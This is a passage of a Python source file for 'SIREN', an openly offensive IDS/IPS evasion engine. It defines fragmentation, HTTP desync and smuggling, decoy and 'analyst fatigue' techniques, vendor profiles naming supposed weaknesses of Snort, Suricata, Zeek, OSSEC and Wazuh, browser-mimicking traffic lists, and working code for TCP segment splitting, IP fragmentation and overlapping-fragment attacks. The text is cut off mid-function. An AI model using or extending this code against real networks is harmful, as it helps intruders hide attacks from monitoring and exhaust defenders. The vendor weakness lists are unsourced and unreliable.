#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
████████████████████████████████████████████████████████████████████████████████████
██                                                                                ██
██  ⚔️  SIREN IDS EVASION — Intrusion Detection System Bypass Engine  ⚔️       ██
██                                                                                ██
██  Motor completo de evasao de IDS/IPS com fragmentacao de pacotes,              ██
██  manipulacao de timing, abuso de protocolo e geracao de decoys.                ██
██                                                                                ██
██  Capacidades:                                                                  ██
██    • Packet fragmentation — TCP segmentation, IP fragmentation, overlaps     ██
██    • Timing evasion — slow-rate, jitter, time-of-day scheduling             ██
██    • Protocol abuse — HTTP desync, smuggling, chunked abuse, verb tamper     ██
██    • Traffic mixing — blend attacks with legitimate browsing patterns        ██
██    • Session splitting — distribute payloads across multiple sessions        ██
██    • Decoy generation — noise traffic, fake probes, analyst fatigue          ██
██    • Normalization exploits — path/encoding/unicode/null differences         ██
██    • Multi-vendor — Snort, Suricata, Zeek, OSSEC, Wazuh profiles           ██
██                                                                                ██
██  "SIREN nao dispara alertas — ela e o silencio entre eles."                   ██
██                                                                                ██
████████████████████████████████████████████████████████████████████████████████████
"""

from __future__ import annotations

import copy
import hashlib
import json
import logging
import math
import os
import random
import re
import socket
import string
import struct
import threading
import time
import urllib.parse
import uuid
from collections import defaultdict, deque
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import (
    Any,
    Callable,
    Deque,
    Dict,
    FrozenSet,
    List,
    Optional,
    Set,
    Tuple,
    Union,
)

logger = logging.getLogger("siren.evasion.ids_evasion")


# ════════════════════════════════════════════════════════════════════════════════
# CONSTANTS
# ════════════════════════════════════════════════════════════════════════════════

MAX_FRAGMENT_SIZE = 8
MIN_FRAGMENT_SIZE = 1
DEFAULT_MTU = 1500
MAX_PAYLOAD_SIZE = 65535
DEFAULT_FRAGMENT_TIMEOUT = 30.0
MAX_FRAGMENTS = 512
DEFAULT_OVERLAP_BYTES = 4
MAX_DECOY_TARGETS = 50
MAX_DECOY_PORTS = 1024
DEFAULT_SCAN_DELAY = 60.0
MAX_SESSION_POOL_SIZE = 64
DEFAULT_JITTER_RANGE = (0.5, 3.0)
MIN_SLOW_RATE_INTERVAL = 30.0
MAX_SLOW_RATE_INTERVAL = 120.0
DEFAULT_BURST_SIZE = 5
DEFAULT_PAUSE_DURATION = 30.0
MAX_USER_AGENTS = 200
MAX_REFERRER_CHAIN = 10
MAX_EVASION_TECHNIQUES = 256
NORMALIZATION_TEST_DEPTH = 8
DEFAULT_CONFIDENCE_THRESHOLD = 0.6
MAX_SMUGGLING_PAYLOADS = 50
CHUNK_ENCODING_VARIATIONS = 12


@dataclass
class IDSEvasionConfig:
    """Configuration for IDS evasion engine constants."""
    max_fragment_size: int = MAX_FRAGMENT_SIZE
    min_fragment_size: int = MIN_FRAGMENT_SIZE
    default_mtu: int = DEFAULT_MTU
    max_payload_size: int = MAX_PAYLOAD_SIZE
    default_fragment_timeout: float = DEFAULT_FRAGMENT_TIMEOUT
    max_fragments: int = MAX_FRAGMENTS
    default_overlap_bytes: int = DEFAULT_OVERLAP_BYTES
    max_decoy_targets: int = MAX_DECOY_TARGETS
    max_decoy_ports: int = MAX_DECOY_PORTS
    default_scan_delay: float = DEFAULT_SCAN_DELAY
    max_session_pool_size: int = MAX_SESSION_POOL_SIZE
    default_jitter_range: Tuple[float, float] = DEFAULT_JITTER_RANGE
    min_slow_rate_interval: float = MIN_SLOW_RATE_INTERVAL
    max_slow_rate_interval: float = MAX_SLOW_RATE_INTERVAL
    default_burst_size: int = DEFAULT_BURST_SIZE
    default_pause_duration: float = DEFAULT_PAUSE_DURATION
    max_user_agents: int = MAX_USER_AGENTS
    max_referrer_chain: int = MAX_REFERRER_CHAIN
    max_evasion_techniques: int = MAX_EVASION_TECHNIQUES
    normalization_test_depth: int = NORMALIZATION_TEST_DEPTH
    default_confidence_threshold: float = DEFAULT_CONFIDENCE_THRESHOLD
    max_smuggling_payloads: int = MAX_SMUGGLING_PAYLOADS
    chunk_encoding_variations: int = CHUNK_ENCODING_VARIATIONS


# ════════════════════════════════════════════════════════════════════════════════
# ENUMS
# ════════════════════════════════════════════════════════════════════════════════

class IDSVendor(Enum):
    """Known IDS/IPS vendors and platforms."""
    SNORT = auto()
    SURICATA = auto()
    ZEEK = auto()
    OSSEC = auto()
    WAZUH = auto()
    UNKNOWN = auto()


class EvasionCategory(Enum):
    """Categories of IDS evasion techniques."""
    FRAGMENTATION = auto()
    TIMING = auto()
    PROTOCOL_ABUSE = auto()
    TRAFFIC_MIXING = auto()
    SESSION_SPLITTING = auto()
    DECOY_GENERATION = auto()
    NORMALIZATION_EXPLOIT = auto()
    ENCODING_ABUSE = auto()
    INSERTION_ATTACK = auto()
    EVASION_ATTACK = auto()
    DENIAL_OF_SERVICE = auto()
    OBFUSCATION = auto()


class TimingStrategy(Enum):
    """Timing-based evasion strategies."""
    PARANOID = auto()       # 1 request per 5 minutes
    SNEAKY = auto()         # 1 request per 15-30 seconds
    POLITE = auto()         # 1 request per 2-5 seconds
    NORMAL = auto()         # No artificial delay
    AGGRESSIVE = auto()     # Maximum speed
    SLOW_RATE = auto()      # 1 request per minute
    RANDOM_JITTER = auto()  # Random delays between 0.5-60s
    BURST_PAUSE = auto()    # Burst of N then pause
    TIME_OF_DAY = auto()    # Schedule attacks during high-traffic hours


class FragmentStrategy(Enum):
    """Packet fragmentation strategies."""
    TCP_SEGMENT_SPLIT = auto()
    IP_FRAGMENTATION = auto()
    FRAGMENT_OVERLAP = auto()
    TINY_FRAGMENT = auto()
    REASSEMBLY_TIMEOUT = auto()
    OUT_OF_ORDER = auto()
    MTU_MANIPULATION = auto()
    DUPLICATE_FRAGMENT = auto()
    OVERLAPPING_OFFSET = auto()
    INTERLEAVED = auto()


class ProtocolAbuseType(Enum):
    """Protocol abuse categories."""
    HTTP_DESYNC_CL_TE = auto()
    HTTP_DESYNC_TE_CL = auto()
    HTTP_DESYNC_TE_TE = auto()
    REQUEST_SMUGGLING = auto()
    CHUNKED_ENCODING_ABUSE = auto()
    HTTP2_DOWNGRADE = auto()
    HTTP_PIPELINING = auto()
    WEBSOCKET_HIJACK = auto()
    VERB_TAMPERING = auto()
    HEADER_INJECTION = auto()
    CONNECTION_REUSE = auto()


class NormalizationTrick(Enum):
    """Normalization difference exploit types."""
    PATH_TRAVERSAL = auto()
    DOUBLE_URL_ENCODING = auto()
    UNICODE_NORMALIZATION = auto()
    NULL_BYTE_INJECTION = auto()
    BACKSLASH_FORWARD_SLASH = auto()
    CASE_SENSITIVITY = auto()
    CHARSET_INTERPRETATION = auto()
    OVERLONG_UTF8 = auto()
    BARE_BYTE_ENCODING = auto()
    PARAMETER_POLLUTION = auto()
    PATH_SEGMENT_MANIPULATION = auto()


class DecoyType(Enum):
    """Types of decoy traffic."""
    PORT_SCAN_DECOY = auto()
    VULNERABILITY_PROBE = auto()
    BENIGN_SIGNATURE_MATCH = auto()
    HONEYTOKEN_TRIGGER = auto()
    NOISE_TRAFFIC = auto()
    FALSE_FLAG = auto()
    ANALYST_FATIGUE = auto()


class TrafficProfile(Enum):
    """Legitimate traffic profiles for mixing."""
    WEB_BROWSING = auto()
    API_CLIENT = auto()
    MOBILE_APP = auto()
    BOT_CRAWLER = auto()
    STREAMING = auto()
    SOCIAL_MEDIA = auto()
    EMAIL_CLIENT = auto()
    FILE_DOWNLOAD = auto()


# ════════════════════════════════════════════════════════════════════════════════
# DATACLASSES
# ════════════════════════════════════════════════════════════════════════════════

@dataclass
class IDSFinding:
    """A single IDS evasion finding or result."""
    finding_id: str = ""
    technique: str = ""
    category: str = ""
    target_ids: str = ""
    success: bool = False
    confidence: float = 0.0
    payload_original: str = ""
    payload_evaded: str = ""
    description: str = ""
    detection_bypassed: bool = False
    alert_triggered: bool = False
    rule_id: str = ""
    severity: str = "info"
    timestamp: float = 0.0
    metadata: Dict[str, Any] = field(default_factory=dict)

    def __post_init__(self) -> None:
        if not self.finding_id:
            self.finding_id = f"ids-{uuid.uuid4().hex[:12]}"
        if self.timestamp == 0.0:
            self.timestamp = time.time()

    def to_dict(self) -> Dict[str, Any]:
        return {
            "finding_id": self.finding_id,
            "technique": self.technique,
            "category": self.category,
            "target_ids": self.target_ids,
            "success": self.success,
            "confidence": self.confidence,
            "payload_original": self.payload_original,
            "payload_evaded": self.payload_evaded,
            "description": self.description,
            "detection_bypassed": self.detection_bypassed,
            "alert_triggered": self.alert_triggered,
            "rule_id": self.rule_id,
            "severity": self.severity,
            "timestamp": self.timestamp,
            "metadata": self.metadata,
        }


@dataclass
class IDSEvasionReport:
    """Complete IDS evasion assessment report."""
    report_id: str = ""
    target: str = ""
    ids_vendor: str = ""
    start_time: float = 0.0
    end_time: float = 0.0
    total_techniques_tested: int = 0
    successful_evasions: int = 0
    failed_evasions: int = 0
    partial_evasions: int = 0
    evasion_rate: float = 0.0
    findings: List[IDSFinding] = field(default_factory=list)
    techniques_used: List[str] = field(default_factory=list)
    categories_tested: List[str] = field(default_factory=list)
    recommendations: List[str] = field(default_factory=list)
    risk_score: float = 0.0
    summary: str = ""
    metadata: Dict[str, Any] = field(default_factory=dict)

    def __post_init__(self) -> None:
        if not self.report_id:
            self.report_id = f"ids-report-{uuid.uuid4().hex[:12]}"
        if self.start_time == 0.0:
            self.start_time = time.time()

    def to_dict(self) -> Dict[str, Any]:
        return {
            "report_id": self.report_id,
            "target": self.target,
            "ids_vendor": self.ids_vendor,
            "start_time": self.start_time,
            "end_time": self.end_time,
            "total_techniques_tested": self.total_techniques_tested,
            "successful_evasions": self.successful_evasions,
            "failed_evasions": self.failed_evasions,
            "partial_evasions": self.partial_evasions,
            "evasion_rate": self.evasion_rate,
            "findings": [f.to_dict() for f in self.findings],
            "techniques_used": self.techniques_used,
            "categories_tested": self.categories_tested,
            "recommendations": self.recommendations,
            "risk_score": self.risk_score,
            "summary": self.summary,
            "metadata": self.metadata,
        }


@dataclass
class EvasionTechnique:
    """Definition of a single evasion technique."""
    technique_id: str = ""
    name: str = ""
    category: str = ""
    description: str = ""
    target_vendors: List[str] = field(default_factory=list)
    effectiveness: float = 0.0
    stealth_rating: float = 0.0
    complexity: float = 0.0
    prerequisites: List[str] = field(default_factory=list)
    parameters: Dict[str, Any] = field(default_factory=dict)
    enabled: bool = True
    last_success_time: float = 0.0
    success_count: int = 0
    failure_count: int = 0

    def __post_init__(self) -> None:
        if not self.technique_id:
            self.technique_id = f"tech-{uuid.uuid4().hex[:12]}"

    @property
    def success_rate(self) -> float:
        total = self.success_count + self.failure_count
        if total == 0:
            return 0.0
        return self.success_count / total

    def to_dict(self) -> Dict[str, Any]:
        return {
            "technique_id": self.technique_id,
            "name": self.name,
            "category": self.category,
            "description": self.description,
            "target_vendors": self.target_vendors,
            "effectiveness": self.effectiveness,
            "stealth_rating": self.stealth_rating,
            "complexity": self.complexity,
            "prerequisites": self.prerequisites,
            "parameters": self.parameters,
            "enabled": self.enabled,
            "success_rate": self.success_rate,
            "last_success_time": self.last_success_time,
            "success_count": self.success_count,
            "failure_count": self.failure_count,
        }


@dataclass
class TrafficPattern:
    """A traffic pattern used for mixing or decoy generation."""
    pattern_id: str = ""
    name: str = ""
    profile: str = ""
    request_method: str = "GET"
    path_template: str = "/"
    headers: Dict[str, str] = field(default_factory=dict)
    body_template: str = ""
    timing_ms: Tuple[int, int] = (500, 3000)
    frequency: float = 1.0
    is_decoy: bool = False
    user_agents: List[str] = field(default_factory=list)
    referrers: List[str] = field(default_factory=list)
    cookies: Dict[str, str] = field(default_factory=dict)
    metadata: Dict[str, Any] = field(default_factory=dict)

    def __post_init__(self) -> None:
        if not self.pattern_id:
            self.pattern_id = f"tp-{uuid.uuid4().hex[:12]}"

    def to_dict(self) -> Dict[str, Any]:
        return {
            "pattern_id": self.pattern_id,
            "name": self.name,
            "profile": self.profile,
            "request_method": self.request_method,
            "path_template": self.path_template,
            "headers": self.headers,
            "body_template": self.body_template,
            "timing_ms": list(self.timing_ms),
            "frequency": self.frequency,
            "is_decoy": self.is_decoy,
            "user_agents": self.user_agents,
            "referrers": self.referrers,
            "cookies": self.cookies,
            "metadata": self.metadata,
        }


@dataclass
class FragmentSpec:
    """Specification for a single packet fragment."""
    fragment_id: str = ""
    offset: int = 0
    length: int = 0
    data: bytes = b""
    more_fragments: bool = True
    overlap_bytes: int = 0
    ttl: int = 64
    delay_ms: float = 0.0
    duplicate: bool = False
    order_index: int = 0

    def __post_init__(self) -> None:
        if not self.fragment_id:
            self.fragment_id = f"frag-{uuid.uuid4().hex[:8]}"

    def to_dict(self) -> Dict[str, Any]:
        return {
            "fragment_id": self.fragment_id,
            "offset": self.offset,
            "length": self.length,
            "data_len": len(self.data),
            "data_hex": self.data.hex() if len(self.data) <= 64 else self.data[:64].hex() + "...",
            "more_fragments": self.more_fragments,
            "overlap_bytes": self.overlap_bytes,
            "ttl": self.ttl,
            "delay_ms": self.delay_ms,
            "duplicate": self.duplicate,
            "order_index": self.order_index,
        }


@dataclass
class SessionSpec:
    """Specification for a distributed session."""
    session_id: str = ""
    source_ip: str = ""
    source_port: int = 0
    destination_ip: str = ""
    destination_port: int = 0
    payload_chunk: bytes = b""
    chunk_index: int = 0
    total_chunks: int = 0
    connection_id: str = ""
    delay_before_ms: float = 0.0
    protocol: str = "tcp"

    def __post_init__(self) -> None:
        if not self.session_id:
            self.session_id = f"sess-{uuid.uuid4().hex[:10]}"
        if not self.connection_id:
            self.connection_id = f"conn-{uuid.uuid4().hex[:8]}"

    def to_dict(self) -> Dict[str, Any]:
        return {
            "session_id": self.session_id,
            "source_ip": self.source_ip,
            "source_port": self.source_port,
            "destination_ip": self.destination_ip,
            "destination_port": self.destination_port,
            "payload_chunk_len": len(self.payload_chunk),
            "chunk_index": self.chunk_index,
            "total_chunks": self.total_chunks,
            "connection_id": self.connection_id,
            "delay_before_ms": self.delay_before_ms,
            "protocol": self.protocol,
        }


@dataclass
class SmugglePayload:
    """An HTTP request smuggling payload."""
    payload_id: str = ""
    technique: str = ""
    front_end_request: str = ""
    back_end_request: str = ""
    smuggled_content: str = ""
    content_length: int = 0
    transfer_encoding: str = ""
    description: str = ""
    target_servers: List[str] = field(default_factory=list)

    def __post_init__(self) -> None:
        if not self.payload_id:
            self.payload_id = f"smug-{uuid.uuid4().hex[:10]}"

    def to_dict(self) -> Dict[str, Any]:
        return {
            "payload_id": self.payload_id,
            "technique": self.technique,
            "front_end_request": self.front_end_request,
            "back_end_request": self.back_end_request,
            "smuggled_content": self.smuggled_content,
            "content_length": self.content_length,
            "transfer_encoding": self.transfer_encoding,
            "description": self.description,
            "target_servers": self.target_servers,
        }


@dataclass
class NormalizationTest:
    """A normalization difference test case."""
    test_id: str = ""
    trick_type: str = ""
    original_path: str = ""
    normalized_variants: List[str] = field(default_factory=list)
    ids_interpretation: str = ""
    server_interpretation: str = ""
    exploitable: bool = False
    description: str = ""
    metadata: Dict[str, Any] = field(default_factory=dict)

    def __post_init__(self) -> None:
        if not self.test_id:
            self.test_id = f"norm-{uuid.uuid4().hex[:10]}"

    def to_dict(self) -> Dict[str, Any]:
        return {
            "test_id": self.test_id,
            "trick_type": self.trick_type,
            "original_path": self.original_path,
            "normalized_variants": self.normalized_variants,
            "ids_interpretation": self.ids_interpretation,
            "server_interpretation": self.server_interpretation,
            "exploitable": self.exploitable,
            "description": self.description,
            "metadata": self.metadata,
        }


# ════════════════════════════════════════════════════════════════════════════════
# IDS VENDOR PROFILES
# ════════════════════════════════════════════════════════════════════════════════

_IDS_VENDOR_PROFILES: Dict[str, Dict[str, Any]] = {
    "snort": {
        "name": "Snort",
        "reassembly_policy": "first",
        "stream_timeout": 30,
        "max_fragments": 8192,
        "fragment_timeout": 60,
        "normalization_mode": "strict",
        "http_inspect": True,
        "tcp_reassembly": True,
        "known_weaknesses": [
            "fragmentation_overlap_first_policy",
            "ttl_based_evasion",
            "tcp_timestamp_manipulation",
            "http_uri_normalization_gaps",
            "content_match_fragmentation",
        ],
        "default_rules_count": 35000,
        "supports_pcre": True,
        "inline_mode": True,
    },
    "suricata": {
        "name": "Suricata",
        "reassembly_policy": "bsd",
        "stream_timeout": 60,
        "max_fragments": 65535,
        "fragment_timeout": 60,
        "normalization_mode": "moderate",
        "http_inspect": True,
        "tcp_reassembly": True,
        "known_weaknesses": [
            "multi_pattern_matching_bypass",
            "protocol_detection_evasion",
            "lua_script_limitations",
            "high_performance_packet_drop",
            "tls_decryption_gaps",
        ],
        "default_rules_count": 40000,
        "supports_pcre": True,
        "inline_mode": True,
    },
    "zeek": {
        "name": "Zeek (Bro)",
        "reassembly_policy": "bsd",
        "stream_timeout": 300,
        "max_fragments": 65535,
        "fragment_timeout": 120,
        "normalization_mode": "permissive",
        "http_inspect": True,
        "tcp_reassembly": True,
        "known_weaknesses": [
            "passive_only_no_inline",
            "script_performance_limits",
            "cluster_synchronization_gaps",
            "encrypted_traffic_blind_spots",
            "custom_protocol_gaps",
        ],
        "default_rules_count": 0,
        "supports_pcre": False,
        "inline_mode": False,
    },
    "ossec": {
        "name": "OSSEC",
        "reassembly_policy": "none",
        "stream_timeout": 0,
        "max_fragments": 0,
        "fragment_timeout": 0,
        "normalization_mode": "log_based",
        "http_inspect": False,
        "tcp_reassembly": False,
        "known_weaknesses": [
            "log_rotation_gaps",
            "regex_based_detection_bypass",
            "agent_communication_disruption",
            "high_volume_log_flooding",
            "rule_ordering_exploitation",
        ],
        "default_rules_count": 3000,
        "supports_pcre": True,
        "inline_mode": False,
    },
    "wazuh": {
        "name": "Wazuh",
        "reassembly_policy": "none",
        "stream_timeout": 0,
        "max_fragments": 0,
        "fragment_timeout": 0,
        "normalization_mode": "log_based",
        "http_inspect": False,
        "tcp_reassembly": False,
        "known_weaknesses": [
            "log_based_detection_delay",
            "syscheck_interval_gaps",
            "agent_key_rotation_window",
            "api_authentication_bypass",
            "rule_granularity_limits",
        ],
        "default_rules_count": 4000,
        "supports_pcre": True,
        "inline_mode": False,
    },
}


# ════════════════════════════════════════════════════════════════════════════════
# REALISTIC USER AGENT DATABASE
# ════════════════════════════════════════════════════════════════════════════════

_USER_AGENTS: List[str] = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Vivaldi/6.5.3206.55",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; moto g pure) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
]

_REFERRER_DOMAINS: List[str] = [
    "https://www.google.com/search?q=",
    "https://www.bing.com/search?q=",
    "https://search.yahoo.com/search?p=",
    "https://duckduckgo.com/?q=",
    "https://www.reddit.com/r/",
    "https://twitter.com/",
    "https://www.linkedin.com/",
    "https://www.facebook.com/",
    "https://news.ycombinator.com/",
    "https://stackoverflow.com/questions/",
    "https://github.com/",
    "https://medium.com/",
]

_COMMON_PATHS: List[str] = [
    "/", "/index.html", "/about", "/contact", "/login", "/register",
    "/products", "/services", "/blog", "/faq", "/terms", "/privacy",
    "/api/v1/status", "/api/v1/health", "/sitemap.xml", "/robots.txt",
    "/assets/css/main.css", "/assets/js/app.js", "/images/logo.png",
    "/favicon.ico", "/manifest.json", "/.well-known/security.txt",
]

_SEARCH_TERMS: List[str] = [
    "best practices", "tutorial", "how to", "documentation",
    "getting started", "pricing", "reviews", "alternatives",
    "comparison", "features", "demo", "free trial",
]


# ════════════════════════════════════════════════════════════════════════════════
# PACKET FRAGMENTER
# ════════════════════════════════════════════════════════════════════════════════

class PacketFragmenter:
    """
    TCP segment splitting and IP fragmentation engine for IDS evasion.

    Implements multiple fragmentation strategies to bypass IDS signature
    matching by splitting payloads across multiple packets in ways that
    exploit differences in reassembly implementations.

    Usage:
        fragmenter = PacketFragmenter()
        fragments = fragmenter.tcp_segment_split(payload, segment_size=8)
        fragments = fragmenter.ip_fragment(payload, fragment_size=24)
        fragments = fragmenter.fragment_overlap_attack(payload, overlap=4)
        fragments = fragmenter.tiny_fragment_attack(payload)
        fragments = fragmenter.reassembly_timeout_exploit(payload, timeout=30)
        fragments = fragmenter.out_of_order_delivery(payload, fragment_size=16)
        fragments = fragmenter.mtu_manipulation(payload, fake_mtu=68)
    """

    def __init__(self) -> None:
        self._lock = threading.RLock()
        self._fragment_counter: int = 0
        self._fragment_history: Deque[Dict[str, Any]] = deque(maxlen=1000)
        self._strategy_stats: Dict[str, Dict[str, int]] = defaultdict(
            lambda: {"attempts": 0, "successes": 0}
        )
        logger.info("PacketFragmenter initialized")

    def tcp_segment_split(
        self,
        payload: bytes,
        segment_size: int = MAX_FRAGMENT_SIZE,
        *,
        vary_sizes: bool = False,
        min_size: int = MIN_FRAGMENT_SIZE,
    ) -> List[FragmentSpec]:
        """
        Split a TCP payload into multiple small segments.

        Many IDS systems perform signature matching on individual TCP segments
        before reassembly. By splitting a payload across segment boundaries,
        signatures that span multiple bytes can be evaded.

        Args:
            payload: Raw payload bytes to fragment.
            segment_size: Maximum size of each segment.
            vary_sizes: If True, randomize segment sizes for less predictability.
            min_size: Minimum segment size when vary_sizes is True.

        Returns:
            List of FragmentSpec objects representing TCP segments.
        """
        with self._lock:
            if not payload:
                return []

            segment_size = max(min_size, min(segment_size, len(payload)))
            fragments: List[FragmentSpec] = []
            offset = 0
            order_idx = 0

            while offset < len(payload):
                if vary_sizes:
                    current_size = random.randint(min_size, segment_size)
                else:
                    current_size = segment_size

                chunk = payload[offset:offset + current_size]
                remaining = len(payload) - offset - len(chunk)

                frag = FragmentSpec(
                    offset=offset,
                    length=len(chunk),
                    data=chunk,
                    more_fragments=remaining > 0,
                    ttl=64,
                    delay_ms=0.0,
                    order_index=order_idx,
                )
                fragments.append(frag)
                offset += len(chunk)
                order_idx += 1

            self._fragment_counter += len(fragments)
            self._record_fragmentation(
                "tcp_segment_split", len(payload), len(fragments)
            )
            logger.debug(
                "TCP segment split: %d bytes -> %d segments (size=%d)",
                len(payload), len(fragments), segment_size,
            )
            return fragments

    def ip_fragment(
        self,
        payload: bytes,
        fragment_size: int = 24,
        *,
        identification: int = 0,
        dont_fragment: bool = False,
    ) -> List[FragmentSpec]:
        """
        Fragment payload using IP-level fragmentation.

        Generates IP fragments with proper offset calculation. Fragment size
        must be a multiple of 8 (IP fragment offset granularity).

        Args:
            payload: Raw payload to fragment.
            fragment_size: Size of each fragment (rounded down to multiple of 8).
            identification: IP identification field value.
            dont_fragment: If True, simulate DF bit behavior.

        Returns:
            List of FragmentSpec objects representing IP fragments.
        """
        with self._lock:
            if not payload:
                return []
            if dont_fragment:
                return [FragmentSpec(
                    offset=0, length=len(payload), data=payload,
                    more_fragments=False, order_index=0,
                )]

            # IP fragment offset is in units of 8 bytes
            frag_size = max(8, (fragment_size // 8) * 8)
            if identification == 0:
                identification = random.randint(1, 65535)

            fragments: List[FragmentSpec] = []
            offset = 0
            order_idx = 0

            while offset < len(payload):
                chunk = payload[offset:offset + frag_size]
                remaining = len(payload) - offset - len(chunk)

                frag = FragmentSpec(
                    offset=offset,
                    length=len(chunk),
                    data=chunk,
                    more_fragments=remaining > 0,
                    ttl=64,
                    delay_ms=0.0,
                    order_index=order_idx,
                )
                fragments.append(frag)
                offset += len(chunk)
                order_idx += 1

            self._fragment_counter += len(fragments)
            self._record_fragmentation(
                "ip_fragment", len(payload), len(fragments)
            )
            logger.debug(
                "IP fragmentation: %d bytes -> %d fragments (size=%d, id=%d)",
                len(payload), len(fragments), frag_size, identification,
            )
            return fragments

    def fragment_overlap_attack(
        self,
        payload: bytes,
        overlap_bytes: int = DEFAULT_OVERLAP_BYTES,
        *,
        policy: str = "first",
        decoy_data: Optional[bytes] = None,
    ) -> List[FragmentSpec]:
        """
        Create overlapping fragments to exploit reassembly policy differences.

        Different OS and IDS implementations handle overlapping fragments
        differently (first-wins vs last-wins). By sending fragments that
        overlap, the IDS may reassemble a different payload than the target.

        Snort default: first fragment wins (favors first)
        Linux:         last fragment wins (favors last)
        Windows:       first fragment wins (favors first)
        BSD:           first fragment wins (favors first)

        Args:
            payload: The actual payload to deliver (what we want the server to see).
            overlap_bytes: Number of bytes to overlap between fragments.
            policy: Target reassembly policy ('first' or 'last').
            decoy_data: Alternative data for the overlapping portion.

        Returns:
            List of FragmentSpec objects with overlapping offsets.
        """
        with self._lock:
            if not payload:
                return []

            overlap_bytes = min(overlap_bytes, len(payload) // 2)
            if overlap_bytes < 1:
                overlap_bytes = 1

            fragment_size = max(8, len(payload) // 3)
            fragments: List[FragmentSpec] = []

            if decoy_data is None:
                decoy_data = bytes(random.randint(0x41, 0x5A) for _ in range(overlap_bytes))

            if policy == "first":
                # First fragment has the real data in the overlap region
                # Second fragment has decoy data in the overlap region
                # IDS using "first" policy sees real data -> no alert
                # Server using "last" policy sees decoy -> we lose
                # So for "first" policy targets, we reverse it:
                # First fragment: real data, second fragment: decoy overlap

                frag1_data = payload[:fragment_size]
                frag2_start = fragment_size - overlap_bytes
                frag2_data = decoy_data + payload[fragment_size:]

                fragments.append(FragmentSpec(
                    offset=0, length=len(frag1_data), data=frag1_data,
                    more_fragments=True, overlap_bytes=0, order_index=0,
                ))
                fragments.append(FragmentSpec(
                    offset=frag2_start, length=len(frag2_data), data=frag2_data,
                    more_fragments=False, overlap_bytes=overlap_bytes, order_index=1,
                ))
            else:
                # "last" policy: last fragment wins
                frag1_end = fragment_size + overlap_bytes
                frag1_data = payload[:fragment_size] + decoy_data

                frag2_data = payload[fragment_size:]
                frag2_offset = fragment_size

                fragments.append(FragmentSpec(
                    offset=0, length=len(frag1_data), data=frag1_data,
                    more_fragments=True, overlap_bytes=0, order_index=0,
                ))
                fragments.append(FragmentSpec(
                    offset=frag2_offset, length=len(frag2_data), data=frag2_data,
                    more_fragments=False, overlap_bytes=overlap_bytes, order_index=1,
                ))

            self._record_fragmentation(
                "fragment_overlap", len(payload), len(fragments)
            )
            logger.debug(
                "Fragment overlap attack: %d bytes, overlap=%d, policy=%s",
                len(payload), overlap_bytes, policy,
            )
            return fragments

    def tiny_fragment_attack(
        self,
        payload: bytes,
        fragment_size: int = 1,
        *,
        max_fragments: int = MAX_FRAGMENTS,
    ) -> List[FragmentSpec]:
        """
        Generate extremely small fragments (1-8 bytes each).

        Tiny fragments can overwhelm IDS reassembly buffers and cause
        the IDS to drop fragments due to resource constraints, while the
        target host (with more resources for reassembly) processes them
        correctly.

        RFC 791 allows fragments as small as 8 bytes (IP header minimum),
        but TCP headers can be split across fragments as well.

        Args:
            payload: Raw payload to fragment.
            fragment_size: Size of each tiny fragment (1-8 bytes).
            max_fragments: Maximum number of fragments to generate.

        Returns:
            List of FragmentSpec objects with tiny fragments.
        """
        with self._lock:
            if not payload:
                return []

            fragment_size = max(1, min(fragment_size, 8))
            fragments: List[FragmentSpec] = []
            offset = 0
            order_idx = 0

            while offset < len(payload) and order_idx < max_fragments:
                chunk = payload[offset:offset + fragment_size]
                remaining = len(payload) - offset - len(chunk)

                frag = FragmentSpec(
                    offset=offset,
                    length=len(chunk),
                    data=chunk,
                    more_fragments=remaining > 0,
                    ttl=64,
